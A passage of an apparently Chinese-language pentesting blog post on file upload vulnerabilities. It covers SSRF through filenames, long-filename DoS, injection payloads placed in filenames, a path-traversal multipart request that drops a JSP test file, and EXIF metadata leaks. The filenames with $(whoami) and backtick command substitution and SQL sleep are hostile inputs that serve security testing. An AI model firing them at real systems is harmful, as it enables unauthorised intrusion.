+</h3><p>尝试将 URL 作为文件名发送以获取盲 SSRF，例如<code>filename=https://172.17.0.1/internal/file</code>。</p>
+<p>还可以尝试在请求中更改<code>type=&quot;file&quot;</code>为。<code>type=&quot;url&quot;</code></p>
+<h3 id="dos-1" class="heading-element"><span>DOS</span>
+  <a href="#dos-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>后端没有对文件名长度进行限制，可以尝试上传一个名称较大的文件，有时会导致 DoS。</p>
+<p>案例：<a href="https://hackerone.com/reports/764434"target="_blank" rel="external nofollow noopener noreferrer">报告：头像名称参数值过大导致平台上其他用户和程序遭受 DoS 攻击</a></p>
+<h3 id="文件名注入" class="heading-element"><span>文件名注入</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%90%8d%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在文件名中加入 XSS、SQLi、命令注入payload。</p>
+<p>在文件名中加入攻击载荷，服务端可能对上传的文件名进行各种处理，如展示到页面、存储到数据库等，因此可能存在各种各样的注入，如XSS、SQLI、命令注入等</p>
+<p>如上传文件名为<code>test.png</code>，那么我们可以设置变量为<code>§test§.png</code>，然后fuzz一下各种注入的payload，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">a<span class="k">$(</span>whoami<span class="k">)</span>z.png
+</span></span><span class="line"><span class="cl">a<span class="sb">`</span>whoami<span class="sb">`</span>z.png
+</span></span><span class="line"><span class="cl">a<span class="err">&#39;</span><span class="p">;</span><span class="k">select</span>+sleep<span class="o">(</span>10<span class="o">)</span><span class="p">;</span>--z.png
+</span></span><span class="line"><span class="cl">sleep<span class="o">(</span>10<span class="o">)</span>-- -.png
+</span></span><span class="line"><span class="cl">&lt;h1&gt;test&lt;h1&gt;.png
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">2</span><span class="p">*3</span><span class="si">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>命令注入的情况：</p>
+<p>文件上传后，服务端通过系统命令进行文件的重命名、复制、移动、删除等动作，可能调用系统命令执行。未对文件名进行过滤，导致命令注入。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/"target="_blank" rel="external nofollow noopener noreferrer">RCE vulnerability in a file name</a></li>
+<li><a href="https://hackerone.com/reports/191884"target="_blank" rel="external nofollow noopener noreferrer">Remote Unrestricted file Creation/Deletion and Possible RCE.</a></li>
+</ul>
+<h2 id="113-文件路径可控" class="heading-element"><span>1.13. 文件路径可控</span>
+  <a href="#113-%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%e5%8f%af%e6%8e%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>路径遍历</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/uai/download/uploadfileToPath.htm</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">…………</span>
+</span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">-----------------------------570xxxxxxxxx6025274xxxxxxxx1
+</span></span></span><span class="line"><span class="cl"><span class="g">Content-Disposition: form-data; name=&#34;input_localfile&#34;; filename=&#34;xxx.jsp&#34;
+</span></span></span><span class="line"><span class="cl"><span class="g">Content-Type: image/png
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">&lt;%out.println(&#39;test123&#39;);%&gt;
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">-----------------------------570xxxxxxxxx6025274xxxxxxxx1
+</span></span></span><span class="line"><span class="cl"><span class="g">Content-Disposition: form-data; name=&#34;uploadpath&#34;
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">../webapps/notifymsg/devreport/
+</span></span></span><span class="line"><span class="cl"><span class="g">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/343726"target="_blank" rel="external nofollow noopener noreferrer">Unrestricted file upload (RCE)</a></li>
+</ul>
+<h2 id="114-元数据泄漏" class="heading-element"><span>1.14. 元数据泄漏</span>
+  <a href="#114-%e5%85%83%e6%95%b0%e6%8d%ae%e6%b3%84%e6%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>元数据是照片背后的故事，它告诉我们图像文件是如何创建的，在哪里和何时创建的。它还描述了照片的内容，确定了摄影师，并向您展示了图像在后期处理中是如何编辑的。简单地说，假设您使用数码相机单击了一张图片，当该图像被处理并保存在存储设备上时，一些属性被添加到文件中，例如作者、位置、设备信息和其他适用于描述图像信息的信息。</p>
+<p>如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。</p>
+<blockquote>
+<p>Note</p>
+<p>元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF</p>
+</blockquote>
+<p><strong>检查方法：</strong></p>
+<ol>
+<li>在头像上传等图片可以被枚举的功能点上传包含有exif敏感信息的图片，没有的话可以用手机现拍</li>
+<li>下载刚才上传的图片（如果用下面的在线平台这一步可以省略）</li>
+<li>使用 <a href="http://exif.regex.info/exif.cgi"target="_blank" rel="external nofollow noopener noreferrer">http://exif.regex.info/exif.cgi</a> 或者 exiftool 去分析数据</li>
+</ol>
+<p><strong>参考</strong>：</p>
+<ul>
+<li><a href="https://hackerone.com/reports/446238"target="_blank" rel="external nofollow noopener noreferrer">EXIF metadata not stripped from JPG group logos</a>，隐私泄露问题</li>
+</ul>
+<h2 id="参考文章" class="heading-element"><span>参考文章</span>
+  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li><a href="https://blog.gm7.org/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.gm7.org/</a>个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传</li>
+<li><a href="https://github.com/c0ny1/upload-labs"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/c0ny1/upload-labs</a></li>
+<li><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities"target="_blank" rel="external nofollow noopener noreferrer">https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-10-21 02:49:14">更新于 2024-10-21&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pentest/" class="post-tag" title="标签 - Pentest">Pentest</a><a href="/tags/fileupload/" class="post-tag" title="标签 - FileUpload">FileUpload</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" class="post-nav-item" rel="prev" title="Docker低版本升级"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Docker低版本升级</a><a href="/posts/burp-cph-usage/" class="post-nav-item" rel="next" title="Burp-CPH插件心得">Burp-CPH插件心得<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
